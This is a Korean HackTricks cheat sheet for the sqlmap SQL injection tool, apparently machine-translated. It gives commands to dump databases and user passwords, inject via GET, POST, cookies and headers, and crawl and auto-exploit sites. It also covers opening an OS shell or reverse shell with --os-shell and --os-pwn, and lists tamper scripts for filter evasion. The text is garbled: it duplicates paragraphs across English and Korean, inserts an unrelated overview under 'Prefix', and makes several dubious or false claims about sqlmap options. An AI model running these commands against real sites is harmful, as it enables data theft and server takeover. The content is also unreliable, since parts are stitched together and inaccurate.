<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


# SQLmap을 위한 기본 인수

## 일반적인 인수
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## 정보 검색

### 내부
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### DB 데이터

The `--dump` option can be used to retrieve the data from the database. This option allows you to dump all the data from all the tables in the database.

```plaintext
$ sqlmap -u "http://example.com/page.php?id=1" --dump
```

By default, sqlmap will only dump the data from the first table it finds. To dump data from all tables, you can use the `--all` option.

```plaintext
$ sqlmap -u "http://example.com/page.php?id=1" --dump --all
```

You can also specify the tables you want to dump using the `--tables` option.

```plaintext
$ sqlmap -u "http://example.com/page.php?id=1" --dump --tables="users, products"
```

The dumped data will be saved in a file named `dump.csv` by default. You can specify a different output file using the `--output-file` option.

```plaintext
$ sqlmap -u "http://example.com/page.php?id=1" --dump --output-file="data.txt"
```

Note that dumping data from a database without proper authorization is illegal and unethical. Always make sure you have the necessary permissions before attempting to dump data from a database.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# 삽입 위치

## Burp/ZAP 캡처에서

요청을 캡처하고 req.txt 파일을 생성하세요.
```bash
sqlmap -r req.txt --current-user
```
## GET 요청 삽입

In some cases, you may encounter a web application that uses GET requests to retrieve data from a database. This can be a potential vulnerability if the application does not properly sanitize or validate user input. SQL injection can be performed by manipulating the parameters in the GET request URL.

In such cases, you can use SQLMap to automate the process of injecting SQL queries into the GET request parameters. SQLMap is a powerful tool that can detect and exploit SQL injection vulnerabilities.

To perform a GET request injection using SQLMap, follow these steps:

1. Identify the vulnerable parameter: Analyze the web application and identify the parameter in the GET request URL that is vulnerable to SQL injection.

2. Capture the GET request: Use a proxy tool like Burp Suite to intercept and capture the GET request.

3. Save the request to a file: Save the intercepted GET request to a file, such as `request.txt`.

4. Run SQLMap: Open a terminal and run the following command to start SQLMap:

   ```
   sqlmap -r request.txt
   ```

   This command tells SQLMap to read the GET request from the file `request.txt`.

5. Analyze the results: SQLMap will analyze the GET request and attempt to exploit any SQL injection vulnerabilities. It will provide detailed information about the vulnerability, such as the database type, the number of columns, and the names of the tables.

6. Exploit the vulnerability: Once SQLMap identifies a vulnerability, you can use it to exploit the vulnerability and retrieve data from the database. SQLMap provides various options for extracting data, such as dumping the entire database or extracting specific tables or columns.

By following these steps, you can effectively perform a GET request injection using SQLMap and exploit SQL injection vulnerabilities in web applications. Remember to always obtain proper authorization before conducting any penetration testing activities.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## POST 요청 삽입

In some cases, the target application may use POST requests to send data to the server. In these scenarios, you can perform SQL injection by manipulating the POST parameters.

일부 경우에는 대상 애플리케이션이 데이터를 서버로 보내기 위해 POST 요청을 사용할 수 있습니다. 이러한 시나리오에서는 POST 매개변수를 조작하여 SQL 삽입을 수행할 수 있습니다.

To perform a POST request injection, you can use the `--data` option in SQLMap. This option allows you to specify the POST data to be sent to the server.

POST 요청 삽입을 수행하기 위해 SQLMap에서 `--data` 옵션을 사용할 수 있습니다. 이 옵션을 사용하면 서버로 보낼 POST 데이터를 지정할 수 있습니다.

Here is an example command:

다음은 예제 명령어입니다:

```plaintext
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --method POST
```

In this example, we are targeting the login page of `http://example.com` and injecting the `username` and `password` parameters. SQLMap will automatically detect and exploit any SQL injection vulnerabilities in the POST data.

이 예제에서는 `http://example.com`의 로그인 페이지를 대상으로 하고 `username` 및 `password` 매개변수를 삽입합니다. SQLMap은 POST 데이터에서 SQL 삽입 취약점을 자동으로 감지하고 악용합니다.

Remember to properly encode the POST data if necessary, especially if it contains special characters or spaces. You can use tools like Burp Suite or OWASP ZAP to capture and analyze the POST requests.

특히 특수 문자나 공백이 포함된 경우 POST 데이터를 필요한 경우 적절하게 인코딩해야 합니다. Burp Suite나 OWASP ZAP과 같은 도구를 사용하여 POST 요청을 캡처하고 분석할 수 있습니다.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## 헤더 및 기타 HTTP 메소드에서의 인젝션

In addition to injecting payloads in the URL parameters, SQL injection can also occur in the headers and other HTTP methods. This can be exploited to manipulate the behavior of the web application and gain unauthorized access to sensitive information.

### Header Injection

Header injection occurs when user-controlled data is injected into the HTTP headers of a request. This can lead to various security vulnerabilities, such as HTTP response splitting and cross-site scripting (XSS).

To test for header injection, you can use tools like `sqlmap` to inject payloads into headers and observe the application's response. By injecting malicious data into headers, an attacker can potentially manipulate the server's behavior and perform attacks like session hijacking or cookie poisoning.

### HTTP Method Injection

HTTP method injection involves manipulating the HTTP method used in a request. By injecting payloads into the HTTP method, an attacker can bypass security controls and perform unauthorized actions on the server.

For example, an attacker can use the `TRACE` method to retrieve sensitive information from the server's response. By injecting payloads into the `TRACE` method, an attacker can force the server to reflect the injected data back in the response, potentially revealing sensitive information.

To test for HTTP method injection, you can use tools like `sqlmap` to inject payloads into different HTTP methods and observe the application's response. This can help identify vulnerabilities and potential attack vectors.

It is important to note that header and HTTP method injection vulnerabilities can have severe consequences, including data leakage, unauthorized access, and remote code execution. Therefore, it is crucial to regularly test and secure web applications against these types of injections.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## 두 번째 순서 인젝션

Second order injection, also known as **stored procedure injection**, occurs when user input is stored in a database and later used in a query without proper sanitization or validation. This vulnerability allows an attacker to manipulate the query structure and execute arbitrary SQL commands.

두 번째 순서 인젝션 또는 **저장 프로시저 인젝션**은 사용자 입력이 데이터베이스에 저장되고 나중에 쿼리에서 적절한 살균 또는 유효성 검사 없이 사용될 때 발생합니다. 이 취약점을 통해 공격자는 쿼리 구조를 조작하고 임의의 SQL 명령을 실행할 수 있습니다.

To exploit second order injection, an attacker typically needs to find a vulnerable input field that is stored in the database and later used in a query. The attacker can then craft a payload that will be executed when the stored input is used in a query.

두 번째 순서 인젝션을 악용하기 위해서는 일반적으로 데이터베이스에 저장되고 나중에 쿼리에서 사용되는 취약한 입력 필드를 찾아야 합니다. 그런 다음 공격자는 저장된 입력이 쿼리에서 사용될 때 실행될 페이로드를 작성할 수 있습니다.

To prevent second order injection, it is important to properly sanitize and validate all user input before using it in a query. This can be done by using parameterized queries or prepared statements, which ensure that user input is treated as data and not as part of the query structure.

두 번째 순서 인젝션을 방지하기 위해서는 쿼리에서 사용하기 전에 모든 사용자 입력을 적절하게 살균화하고 유효성을 검사하는 것이 중요합니다. 이는 매개변수화된 쿼리 또는 준비된 문을 사용하여 수행할 수 있으며, 이를 통해 사용자 입력이 쿼리 구조의 일부가 아닌 데이터로 처리되도록 보장할 수 있습니다.

It is also recommended to regularly update and patch the database management system to fix any known vulnerabilities that could be exploited through second order injection.

또한 두 번째 순서 인젝션을 통해 악용될 수 있는 알려진 취약점을 수정하기 위해 데이터베이스 관리 시스템을 정기적으로 업데이트하고 패치하는 것이 권장됩니다.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## 쉘

The `--os-shell` option allows you to obtain an interactive shell on the target system. This can be useful for further exploration and exploitation of the compromised system.

To use this option, you need to have the necessary privileges on the target system. Once you have successfully exploited a vulnerability and gained access to the system, you can use the `--os-shell` option to open a shell.

Here's an example of how to use the `--os-shell` option:

```
sqlmap -u http://example.com/vulnerable.php?id=1 --os-shell
```

This command will exploit the SQL injection vulnerability in the `vulnerable.php` script and open an interactive shell on the target system.

Once you have a shell, you can execute commands on the target system as if you were physically present. This can allow you to perform various actions, such as browsing files, modifying configurations, or even gaining root access.

It's important to note that obtaining a shell on a target system without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal authorization before attempting any hacking activities.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## SQLmap을 사용하여 웹사이트 크롤링 및 자동으로 취약점 공격하기

SQLmap is a powerful tool for automating SQL injection attacks. In addition to exploiting SQL injection vulnerabilities, it can also be used to crawl a website and discover additional injection points. This can be useful for identifying potential targets for further exploitation.

SQLmap은 SQL 인젝션 공격을 자동화하는 강력한 도구입니다. SQL 인젝션 취약점을 공격하는 것 외에도, 웹사이트를 크롤링하고 추가적인 인젝션 포인트를 발견하는 데에도 사용할 수 있습니다. 이는 추가적인 공격 대상을 식별하는 데에 유용할 수 있습니다.

To crawl a website with SQLmap, you can use the `--crawl` option followed by the target URL. This will instruct SQLmap to automatically crawl the website and identify potential injection points.

SQLmap을 사용하여 웹사이트를 크롤링하려면, 대상 URL 뒤에 `--crawl` 옵션을 사용하면 됩니다. 이렇게 하면 SQLmap이 웹사이트를 자동으로 크롤링하고 잠재적인 인젝션 포인트를 식별하도록 지시할 수 있습니다.

```bash
sqlmap -u <target_url> --crawl
```

During the crawling process, SQLmap will analyze each parameter and form on the website to determine if it is vulnerable to SQL injection. If a vulnerability is found, SQLmap will automatically exploit it and extract data from the database.

크롤링 과정에서 SQLmap은 웹사이트의 각 매개변수와 폼을 분석하여 SQL 인젝션에 취약한지 여부를 판단합니다. 취약점이 발견되면 SQLmap은 자동으로 해당 취약점을 공격하고 데이터베이스에서 데이터를 추출합니다.

It's important to note that crawling a website and exploiting vulnerabilities without proper authorization is illegal and unethical. Always ensure that you have permission from the website owner before performing any security testing.

웹사이트를 크롤링하고 취약점을 공격하는 것은 적절한 권한 없이는 불법적이고 윤리적으로 문제가 될 수 있습니다. 보안 테스트를 수행하기 전에 항상 웹사이트 소유자로부터 허가를 받았는지 확인해야 합니다.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
# 접미사 설정

By default, SQLMap injects payloads at the end of the original query. However, you can customize the injection by setting a suffix. This allows you to inject payloads at a specific location within the query.

To set a suffix, use the `--suffix` option followed by the desired suffix value. For example, to inject payloads after the `WHERE` clause, you can use the following command:

```
sqlmap -u "http://example.com/page.php?id=1" --suffix=" AND 1=1"
```

In this example, the payload will be injected after the `WHERE` clause, resulting in a modified query like this:

```
SELECT * FROM users WHERE id=1 AND 1=1
```

By customizing the injection with a suffix, you can target specific parts of the query and increase the chances of successful exploitation.
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## 접두사

---

## Table of Contents

- [Prefix](#prefix)
- [Introduction](#introduction)
- [SQL Injection](#sql-injection)
- [SQLMap](#sqlmap)
  - [Installation](#installation)
  - [Basic Usage](#basic-usage)
  - [Advanced Usage](#advanced-usage)
  - [Tamper Scripts](#tamper-scripts)
  - [Techniques](#techniques)
  - [Options](#options)
  - [Examples](#examples)
  - [Tips and Tricks](#tips-and-tricks)
  - [References](#references)

---

## 소개

SQLMap은 SQL 삽입 공격을 자동화하는 오픈 소스 도구입니다. 이 도구는 다양한 데이터베이스 관리 시스템(DBMS)에서 SQL 삽입 취약점을 찾고 악용할 수 있습니다. SQLMap은 사용하기 쉽고 강력한 기능을 제공하여 펜테스터가 웹 응용 프로그램에서 SQL 삽입 취약점을 식별하고 악용하는 데 도움을 줍니다.

---

## SQL 삽입

SQL 삽입은 웹 응용 프로그램에서 가장 일반적인 보안 취약점 중 하나입니다. 이 취약점은 사용자 입력을 적절하게 처리하지 않는 경우 발생할 수 있습니다. 공격자는 악의적인 SQL 문을 삽입하여 데이터베이스에 대한 액세스 권한을 획득하거나 데이터베이스의 데이터를 조작할 수 있습니다.

---

## SQLMap

SQLMap은 SQL 삽입 취약점을 자동으로 탐지하고 악용하는 데 사용되는 도구입니다. 이 도구는 다양한 기능과 옵션을 제공하여 펜테스터가 웹 응용 프로그램에서 SQL 삽입 취약점을 식별하고 악용하는 데 도움을 줍니다.

### 설치

SQLMap을 설치하려면 다음 명령을 실행하세요:

```bash
$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

### 기본 사용법

SQLMap을 사용하여 웹 응용 프로그램에서 SQL 삽입 취약점을 탐지하려면 다음 명령을 실행하세요:

```bash
$ python sqlmap.py -u <target_url> --dbs
```

### 고급 사용법

SQLMap은 다양한 고급 사용법을 제공합니다. 이를 통해 펜테스터는 웹 응용 프로그램에서 발견한 SQL 삽입 취약점을 악용할 수 있습니다. 자세한 내용은 [SQLMap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki/Usage)를 참조하세요.

### 변조 스크립트

SQLMap은 변조 스크립트를 사용하여 SQL 삽입 취약점을 우회하고 탐지를 어렵게 만들 수 있습니다. 변조 스크립트는 SQLMap의 `-tamper` 옵션을 사용하여 적용할 수 있습니다.

### 기술

SQLMap은 다양한 기술을 사용하여 SQL 삽입 취약점을 탐지하고 악용합니다. 이러한 기술은 데이터베이스 관리 시스템(DBMS)에 따라 다를 수 있습니다. SQLMap은 자동으로 적절한 기술을 선택하여 사용합니다.

### 옵션

SQLMap은 다양한 옵션을 제공하여 사용자가 원하는 대로 도구를 구성할 수 있습니다. 이러한 옵션은 SQLMap의 명령 줄 인터페이스(CLI)를 통해 설정할 수 있습니다.

### 예제

다음은 SQLMap을 사용하여 SQL 삽입 취약점을 탐지하고 악용하는 예제입니다:

```bash
$ python sqlmap.py -u http://example.com/index.php?id=1 --dbs
```

### 팁과 트릭

SQLMap을 사용할 때 다음 팁과 트릭을 활용하세요:

- `-v` 옵션을 사용하여 상세한 출력을 확인하세요.
- `--level` 옵션을 사용하여 탐지 수준을 조정하세요.
- `--risk` 옵션을 사용하여 탐지 위험 수준을 조정하세요.

### 참고 자료

- [SQLMap 공식 문서](https://github.com/sqlmapproject/sqlmap/wiki)
- [SQLMap 사용 예제](https://github.com/sqlmapproject/sqlmap/wiki/Usage-Examples)
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## 불리언 인젝션 찾는 방법 도움말

Boolean-based SQL injection은 웹 응용 프로그램에서 발생하는 일반적인 취약점 중 하나입니다. 이 취약점을 이용하여 데이터베이스의 정보를 추출하거나 조작할 수 있습니다. SQLMap은 불리언 인젝션을 찾는 데 도움이 되는 강력한 도구입니다.

불리언 인젝션을 찾기 위해 SQLMap을 사용하는 방법은 다음과 같습니다.

1. SQLMap을 설치하고 실행합니다.
2. 명령 프롬프트 또는 터미널에서 다음 명령을 입력합니다.

   ```
   sqlmap -u <URL> --level=<레벨> --risk=<위험도>
   ```

   여기서 `<URL>`은 대상 웹 응용 프로그램의 URL이고, `<레벨>`은 테스트의 깊이를 나타내는 숫자(1부터 5까지)이며, `<위험도>`는 테스트의 위험도를 나타내는 숫자(1부터 3까지)입니다.

3. SQLMap은 자동으로 불리언 인젝션을 탐지하고 취약점을 확인합니다. 결과는 명령 프롬프트 또는 터미널에 표시됩니다.

불리언 인젝션을 찾는 것은 웹 응용 프로그램의 보안을 강화하는 데 중요합니다. SQLMap을 사용하여 취약점을 식별하고 조치를 취함으로써 시스템의 안전성을 높일 수 있습니다.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Tamper (조작)

Tamper는 SQLMap에서 사용되는 옵션으로, SQL 주입 공격을 수행할 때 데이터베이스 서버로 전송되는 요청을 조작하는 데 사용됩니다. 이를 통해 SQL 주입 공격의 성공률을 높일 수 있습니다.

Tamper 옵션은 SQLMap이 자동으로 생성한 SQL 주입 페이로드를 변형시키는 데 사용됩니다. 이를 통해 공격자는 데이터베이스 서버에서 필터링되거나 감지될 수 있는 특정 문자열을 우회할 수 있습니다.

Tamper 옵션은 다양한 페이로드 변형 기법을 제공합니다. 예를 들어, 문자열을 URL 인코딩하거나 대소문자를 변환하는 등의 변형을 수행할 수 있습니다. 이를 통해 SQL 주입 공격을 감지하기 어렵게 만들 수 있습니다.

Tamper 옵션은 `-tamper` 플래그를 사용하여 활성화할 수 있습니다. 사용 가능한 Tamper 스크립트는 SQLMap의 `tamper` 디렉토리에 위치하며, 사용자 정의 Tamper 스크립트를 작성하여 사용할 수도 있습니다.

Tamper 옵션은 SQL 주입 공격의 성공률을 높이고, 필터링 및 감지를 우회하여 데이터베이스 서버에 대한 액세스를 얻을 수 있는 강력한 도구입니다. 그러나 항상 윤리적인 방식으로 사용해야 하며, 적법한 권한과 동의를 받지 않은 시스템에는 사용해서는 안 됩니다.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | 설명 |
| :--- | :--- |
| apostrophemask.py | 아포스트로피 문자를 UTF-8 전체 너비의 대응 문자로 대체합니다. |
| apostrophenullencode.py | 아포스트로피 문자를 불법적인 이중 유니코드 대응 문자로 대체합니다. |
| appendnullbyte.py | 페이로드의 끝에 인코딩된 NULL 바이트 문자를 추가합니다. |
| base64encode.py | 주어진 페이로드의 모든 문자를 Base64로 인코딩합니다. |
| between.py | '>' 연산자를 'NOT BETWEEN 0 AND #'로 대체합니다. |
| bluecoat.py | SQL 문 뒤의 공백 문자를 유효한 임의의 공백 문자로 대체한 다음 문자 '='을 LIKE 연산자로 대체합니다. |
| chardoubleencode.py | 주어진 페이로드의 모든 문자를 이중 URL 인코딩합니다(이미 인코딩된 문자는 처리하지 않음). |
| commalesslimit.py | 'LIMIT M, N'과 같은 인스턴스를 'LIMIT N OFFSET M'으로 대체합니다. |
| commalessmid.py | 'MID(A, B, C)'와 같은 인스턴스를 'MID(A FROM B FOR C)'로 대체합니다. |
| concat2concatws.py | 'CONCAT(A, B)'와 같은 인스턴스를 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'로 대체합니다. |
| charencode.py | 주어진 페이로드의 모든 문자를 URL 인코딩합니다(이미 인코딩된 문자는 처리하지 않음). |
| charunicodeencode.py | 주어진 페이로드의 인코딩되지 않은 문자를 유니코드 URL 인코딩합니다(이미 인코딩된 문자는 처리하지 않음). "%u0022" |
| charunicodeescape.py | 주어진 페이로드의 인코딩되지 않은 문자를 유니코드 URL 인코딩합니다(이미 인코딩된 문자는 처리하지 않음). "\u0022" |
| equaltolike.py | 모든 등호 연산자('=')를 'LIKE' 연산자로 대체합니다. |
| escapequotes.py | 따옴표('와 ")를 슬래시로 이스케이프합니다. |
| greatest.py | '>' 연산자를 'GREATEST' 대응 문자로 대체합니다. |
| halfversionedmorekeywords.py | 각 키워드 앞에 버전별 MySQL 주석을 추가합니다. |
| ifnull2ifisnull.py | 'IFNULL(A, B)'와 같은 인스턴스를 'IF(ISNULL(A), B, A)'로 대체합니다. |
| modsecurityversioned.py | 버전별 주석으로 완전한 쿼리를 감싸줍니다. |
| modsecurityzeroversioned.py | 제로 버전별 주석으로 완전한 쿼리를 감싸줍니다. |
| multiplespaces.py | SQL 키워드 주변에 여러 개의 공백을 추가합니다. |
| nonrecursivereplacement.py | 사전에 정의된 SQL 키워드를 대체에 적합한 표현으로 대체합니다(예: .replace("SELECT", "")). |
| percentage.py | 각 문자 앞에 백분율 기호(%)를 추가합니다. |
| overlongutf8.py | 주어진 페이로드의 모든 문자를 변환합니다(이미 인코딩된 문자는 처리하지 않음). |
| randomcase.py | 각 키워드 문자를 무작위 대소문자 값으로 대체합니다. |
| randomcomments.py | SQL 키워드에 무작위 주석을 추가합니다. |
| securesphere.py | 특수 제작된 문자열을 추가합니다. |
| sp\_password.py | 페이로드 끝에 'sp\_password'를 추가하여 DBMS 로그에서 자동으로 난독화합니다. |
| space2comment.py | 공백 문자(' ')을 주석으로 대체합니다. |
| space2dash.py | 공백 문자(' ')을 대시 주석('--')로 대체한 다음 임의의 문자열과 새 줄('\n')을 추가합니다. |
| space2hash.py | 공백 문자(' ')을 파운드 문자('#')로 대체한 다음 임의의 문자열과 새 줄('\n')을 추가합니다. |
| space2morehash.py | 공백 문자(' ')을 파운드 문자('#')로 대체한 다음 임의의 문자열과 새 줄('\n')을 추가합니다. |
| space2mssqlblank.py | 공백 문자(' ')을 유효한 대체 문자 집합에서 임의의 공백 문자로 대체합니다. |
| space2mssqlhash.py | 공백 문자(' ')을 파운드 문자('#')로 대체한 다음 새 줄('\n')을 추가합니다. |
| space2mysqlblank.py | 공백 문자(' ')을 유효한 대체 문자 집합에서 임의의 공백 문자로 대체합니다. |
| space2mysqldash.py | 공백 문자(' ')을 대시 주석('--')로 대체한 다음 새 줄('\n')을 추가합니다. |
| space2plus.py | 공백 문자(' ')을 플러스('+')로 대체합니다. |
| space2randomblank.py | 공백 문자(' ')을 유효한 대체 문자 집합에서 임의의 공백 문자로 대체합니다. |
| symboliclogical.py | AND 및 OR 논리 연산자를 상징적인 대응 문자로 대체합니다(\(&& 및 |
| unionalltounion.py | UNION ALL SELECT를 UNION SELECT로 대체합니다. |
| unmagicquotes.py | 따옴표(')를 다중 바이트 조합 %bf%27로 대체하고 끝에 일반적인 주석을 추가하여 작동하도록 합니다. |
| uppercase.py | 각 키워드 문자를 대문자 값으로 대체합니다('INSERT'). |
| varnish.py | HTTP 헤더 'X-originating-IP'를 추가합니다. |
| versionedkeywords.py | 각 비함수 키워드를 버전별 MySQL 주석으로 둘러싸줍니다. |
| versionedmorekeywords.py | 각 키워드를 버전별 MySQL 주석으로 둘러싸줍니다. |
| xforwardedfor.py | 가짜 HTTP 헤더 'X-Forwarded-For'를 추가합니다. |



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요. 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
